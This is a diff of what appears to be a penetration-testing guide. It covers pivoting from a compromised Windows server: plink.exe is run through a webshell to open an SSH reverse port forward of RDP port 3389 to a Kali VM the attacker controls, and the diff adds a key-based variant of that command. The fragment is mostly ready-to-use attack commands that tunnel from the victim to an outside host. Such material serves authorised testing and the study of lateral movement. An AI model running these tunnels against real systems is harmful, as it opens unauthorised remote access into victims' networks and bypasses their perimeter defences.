@@ -30,8 +30,10 @@ Step 4. Upload the command line tool 'plink.exe' (included in the Putty installa
 Step 5. Execute a 'plink.exe' command with your webshell to create a SSH tunnel between the compromised Windows server and a remote Internet facing 
         server that you control. You can use a Kali Linux VM hosted on the AWS Public Cloud platform or the Azure Public Cloud platform.
 
-        + Example of command to execute on the compromised Windows server (via your webshell) to create an SSH remote port forward rule for the RDP port 3389.
+        + Examples of command to execute on the compromised Windows server (via your webshell) to create an SSH remote port forward rule for the RDP port 3389.
           > echo y | c:\windows\temp\plink.exe <public-IP-pentester-kali-VM> -l root -pw <password> -P 443 -C -R 0.0.0.0:1080:<victim-server-local-IP>:3389 
+          OR
+          > echo y | c:\windows\temp\plink.exe <public-IP-pentester-kali-VM> -l root -i <private-key.ppk> -P 443 -C -R 0.0.0.0:1080:<victim-server-local-IP>:3389 
 
 
 Step 6. Use RDP over the SSH tunnel (remote port forward rule) to log into the compromised Windows server from Internet with your Kali Linux VM
